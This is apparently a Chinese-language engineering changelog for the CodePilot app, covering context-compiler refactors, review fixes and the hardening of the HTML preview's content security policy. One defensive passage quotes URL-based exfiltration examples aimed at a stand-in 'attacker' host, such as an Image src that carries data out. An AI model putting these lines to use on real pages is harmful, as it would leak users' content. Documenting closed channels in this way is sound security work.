- 2026-05-17：**Phase 5d Phase 2 — Context Compiler 一次性交付**。用户调整工作模式："内部按顺序做，外部只交付一次完整结果"。落地：(2a) 新建 `src/lib/harness/context-compiler.ts` — 纯函数 `compileContext(input): CompiledContext`，包含 capability/artifact/memory/workspace fragments + toolDescriptors + runtimeHints + budget + systemPromptText + diagnostics；硬约束包括 artifact-before-capability 顺序、fragmentId 去重、跨 Runtime fragment text 同源、wire-format duplication compile-time FAIL、runtimeHints 只能放 IDs/refs/options。(2b) 新建 `src/lib/harness/expected-differences.ts` — drift ledger，初始 4 条登记 slice 7b 已知 paraphrase；2d 消化后只剩 1 条 `follow_up`。(2c) ClaudeCode SDK claude-client.ts 长期就直接 import MCP canonical 无 paraphrase；slice 2c 加 source-pin 锁住该不变量。(2d) Native 三文件（`builtin-tools/memory-search.ts` / `notification.ts` / `media.ts`）改成 re-export MCP canonical；ledger 三条 slice_2d 条目同步移除。(2e) Codex bridge 移除 `WIDGET_PROMPT` / `MEDIA_PROMPT` / `MEMORY_PROMPT` / `NOTIFY_PROMPT` 四个本地标量；`createCodePilotBuiltinTools().systemPrompt` 恒为 `''`；`unified-adapter.ts` 调 `compileContext({ runtimeId: 'codex_runtime', enabledCapabilities: capabilitiesFromBridgeToolNames(bridge.toolNames), ... })`，把 `compiled.systemPromptText` 喂给 Codex `instructions`。Widget wire-format 单源：slice 2c strip `WIDGET_WIRE_FORMAT_SPEC` 内嵌出 `WIDGET_SYSTEM_PROMPT`，artifactContract 是唯一持有者。新增 32 pins（compiler 23 + equivalence 9）+ 收紧若干旧 pin；handover doc 补 Compiler 章节。**2576/2576 tests pass。Phase 5d Phase 2 ✅ 待 Codex review；Phase 3-5 暂不开。**
- 2026-05-17：**Phase 5d Phase 2 — Codex review P0 + P1 修复**。Review 给出两条 finding：(P0) `unified-adapter.ts` 先执行 `messages = buildMessages(input.body)`，然后才跑 `compileContext` / `bodyWithBridgePrompt`，结果 compiler prompt 只能通过 `providerOptions.openai.instructions` 进 OpenAI Responses 路径；Anthropic-compat / CodePlan / chat-completions 路径用 messages 数组，根本看不到 capability prompt — 这是 send-path blocker。**修法**：把 bridge mount → translateResponsesTools → compileContext → bodyWithBridgePrompt → `buildMessages(bodyWithBridgePrompt)` 排好顺序；新增 `codex-proxy-compiler-message-order.test.ts`（5 pins，剥注释后做 source-grep），禁止 `buildMessages(input.body)` 复现并校验 compileContext 在 buildMessages 之前。(P1) Slice 2c/2d 的"完成口径"对外宣传"三 Runtime 都消费 compiler"但只有 Codex bridge 真的调了；ClaudeCode 当时只在 source 上对齐 MCP canonical、Native 走 re-export — 不是真"adapter only adapt compiler output"。**真按计划完成**：claude-client.ts 改成收集 `enabledCapabilities` Set + 单次 `compileContext({ runtimeId: 'claude_code', ... })` 调用 + 单次 append，删除 5 处 per-capability 内联拼接；`builtin-tools/index.ts getBuiltinTools()` 新增 `capabilityIdForGroup` 映射 + 末尾 `compileContext({ runtimeId: 'codepilot_runtime', ... })` 调用，per-group `systemPrompt` 不再直接返回（capability-tracked 走 compiler，session-search / ask-user-question 等未入契约的 group 仍按原样 passthrough）。新增 contract pins：claude-client.ts 必须 import compileContext + 出现 `compiled.systemPromptText` + runtimeId 字面值；builtin-tools/index.ts 必须 import compileContext + 出现 `capabilityIdForGroup`。handover doc / Phase 2 plan 同步更新口径："三 Runtime 都通过 compileContext 读取注入什么"现在是事实而不是宣传。**2584/2584 tests pass。Phase 5d Phase 2 ✅ 待二次 Codex review；Phase 3-5 仍不开。**
- 2026-05-17：**Phase 5d Phase 2 — 二次 Codex review P1 漏口修复**。第二轮 review 给出两条新 finding：(P1.1) ClaudeCode + Native 都仍然依赖**已有 `systemPrompt`** 才会注入 compiler prompt。claude-client.ts 的 compileContext 块原本被 `if (queryOptions.systemPrompt && typeof ... === 'object' && 'append' in ...)` 守住——上游没传 base systemPrompt 时 `queryOptions.systemPrompt` 是 undefined，compiled.systemPromptText 静默被丢；agent-loop.ts 的 `effectiveSystemPrompt = toolSystemPrompts.length > 0 && systemPrompt ? ... : systemPrompt` 同样漏，`systemPrompt` 为空时 toolSystemPrompts 整组消失。**修法**：claude-client.ts 改成 `if (enabledCapabilities.size > 0)` 后判断 queryOptions.systemPrompt 是否存在，不存在则用 `{type:'preset', preset:'claude_code', append: compiled.systemPromptText}` 初始化；agent-loop.ts 改成 `[systemPrompt, ...toolSystemPrompts].filter(Boolean).join('\n\n') || undefined`，任一侧为空都不再丢另一侧。(P1.2) Native `codepilot-media` group 实际挂载 `createMediaTools()` 含 import + generate 两个工具，但 `capabilityIdForGroup` 只返回 'media_import'，image_generation 从 compiler 的 enabledCapabilities / toolDescriptors / runtimeHints 里彻底消失 — tool surface 与 contract 不一致。**修法**：`capabilityIdForGroup` 改名 `capabilityIdsForGroup` 返回 `readonly string[]`，`codepilot-media` 返回 `['media_import', 'image_generation']`；调用方循环 add。新增 5 个回归测试：(a) Native source 必须用 `filter(Boolean).join` 不许回 `length > 0 && systemPrompt`；(b) claude-client.ts 必须 `if (enabledCapabilities.size > 0)` 不挂 systemPrompt 判断，必须有 preset 初始化分支；(c) `getBuiltinTools` 在 prompt='' 下仍返回非空 systemPrompts；(d) `codepilot-media` case 返回数组含两个 id；(e) compileContext 启用 media_import + image_generation 时必返回 `codepilot_generate_image` toolDescriptor。**2589/2589 tests pass。Phase 5d Phase 2 ✅ 待三次 Codex review；Phase 3-5 仍不开。**
- 2026-05-12：**Phase 4 Markdown / Artifact 主线实现并校正口径**。当前阶段只覆盖 Markdown 数据层、HTML/Artifact 表现层、工程输出引用；显式 HTML Artifact 导出入口 deferred（tech-debt #18）。Codex Runtime / Local Agent Adapter 已从 Phase 4 剥离，后续另开独立计划。
  - Markdown 表现层从“生成弹窗”改为默认 Article + Select 直接切换；显式 HTML Artifact 导出入口 deferred — 第一轮把按钮放在 PreviewPanel 头部 + `.codepilot/artifacts/<slug>.html`，用户两次反馈反对（路径错位 / header 拥挤 / Style Select 已能原地呈现 HTML 形态）。helpers 保留作未来 Export pipeline 脚手架；tech-debt-tracker #18 记录重启条件。
  - 工程输出格式适配只处理 path/line/diff/localhost 这些展示引用，不绑定任何具体 Runtime。
- 2026-05-11：**Phase 4 Step 1 部分落地：Markdown 跨工作区授权 + HTML 外部资源解析（两段）**。
  - Phase 1 = `PreviewSource.trust = workspace / user-selected / agent-referenced` + 确认卡 + `codepilot:file-changed` 自动刷新 + 编辑冲突保护。MultiEdit 入 WRITE_TOOLS；openDynamicTab 同 id 替换 metadata 让 trust 升级跨刷新持久化。
  - Phase 1.5 Round 1（**local relative resources done**）= 同源 route `/api/files/html-preview/[scope]/<abs-path>`，scope 编码进 path segment 让 browser-native relative 解析自动保持 scope；iframe `src=` 替代 `srcDoc`；脚本默认禁；inline-html 无来源仍 strict srcDoc。
  - Phase 1.5 Round 2（**remote https static + blocked-resource policy + dep reload done**）= 路由 CSP 拆 Static / Interactive 两档，Static 放开 `https:` 给 img/style/font/media、`script-src 'none'`；Interactive 额外放开 `script-src https:`，`allow-same-origin` 永不开。PreviewPanel header 永久显示模式徽章 + tooltip（不靠 console 给 blocked 反馈）。`codepilot:file-changed` 对 HTML 预览扩展 sibling-dep 匹配：同 scope baseDir 下的静态资源族变更触发 reload nonce → iframe `src` 变化 → 浏览器重 fetch 全部 subresource。
  - Phase 1.5 Round 3（**CSP egress lockdown + user-selected dep reload done**）= CSP 改 `default-src 'none'` + 显式放允许方向；两档都强制 `connect/frame/object/worker/manifest-src 'none'`，防止 Interactive 模式下脚本通过 fetch / nested iframe / Worker 把预览内容外传；user-selected 外部 HTML 的依赖刷新改用 `htmlPreviewDirname(filePath)` 作为 scope floor（不再因 sourceBaseDir undefined 默默跳过外部 HTML 的 sibling 刷新）。
  - Phase 1.5 Round 4（**Interactive URL-shaped exfiltration closed**）= Round 3 漏了一类通道：Interactive 模式下脚本可以 `new Image().src = 'https://attacker/?d=...'` / `<link rel=stylesheet href=https://...>` / `<script src=https://...>` 把预览内容塞进 URL 外发，这些不走 connect-src 走 img/style/script-src 的 https。Round 4 把 Interactive 模式下所有资源 directive 的 `https:` 全部撤销（script + img + style + font + media），只保留 `'self' data: blob:`。Static 模式不变。产品语义切成两个独立信任决定：「让脚本运行」与「让外部 CDN 资源加载」，后者未来独立 UI 开关。
  - Step 1 余下：长 Markdown 截断空白、`PreviewSource` 生命周期收口、JSX/CSV 失败可读化、DiffSummary 按钮可见性对齐。
- 2026-05-11：**Phase 4 计划 v3 写入（已被 2026-05-12 口径修正覆盖）**。早期把 Local Agent Adapter 与 Markdown / Artifact 放在同一阶段；后续确认这会干扰当前展示层收口，已拆出。
- 2026-05-10：**Phase 3 Step 4b 完成**。后台 `runScheduledAgentTask` 切到 headless `streamClaude`；支持真实工具调用、`permission_request → waiting_for_permission`、任务会话 marker、重跑 / 放弃面板。
- 2026-05-10：**任务来源上下文修复**。`codepilot_schedule_task` 注入 `origin_session_id` / `working_directory`；task-bound session 继承 origin 的 cwd / provider / model / runtime，不再落到助理最新会话。
- 2026-05-10：**heartbeat 后台纪律收紧**。前台打开页面不再触发心跳；scheduler 按间隔后台执行；heartbeat 模式只允许 memory 工具，屏蔽 MCP / shell / web / ambient settings。
- 2026-05-10：**右栏产品决策反向**。File tree 与 Workspace sidebar 从互斥改为可叠加，两个按钮只切换各自面板。
- 2026-05-10：**Assistant 页 IA 收口**。Assistant 设置页不再展示任务列表入口；全局任务管理统一在 `/settings/tasks`。
- 2026-05-10：**复制 ID 与 prefill 修复**。复制对话 ID 统一走 `copyWithToast`；`/chat?prefill=...` 支持 warm navigation 回填。
- 2026-05-10：**delivery log 修复**。`sendNotification` 返回 `deliveries[].error`，任务执行记录能展示 channel 失败原因。

## 审批原则（保留）

每一阶段开工前必须回答三件事：

1. **用户结果**：用户打开产品后会看到什么变化，哪些旧困惑会消失。
2. **验收路径**：用哪个页面、哪个按钮、哪个流程可以验证。
3. **不做什么**：本阶段明确不碰哪些诱人的支线。

如果一个任务只能描述成"改某个模块 / 抽某个接口"，但说不清用户会看到什么，就不能作为独立阶段开工。

## 文档拆分历史

- 2026-05-10：把 active/refactor-closeout.md 从 1000+ 行收口为总控板；Phase 0+1 / Phase 2 / Phase 3 的完整计划与决策日志归档到 `completed/`。
- 2026-05-11：Phase 4 计划 v3 写入 active 总控板，随后在 2026-05-12 校正为 Markdown / Artifact 专项；Local Agent / Runtime 接入从本阶段剥离，后续另开计划。
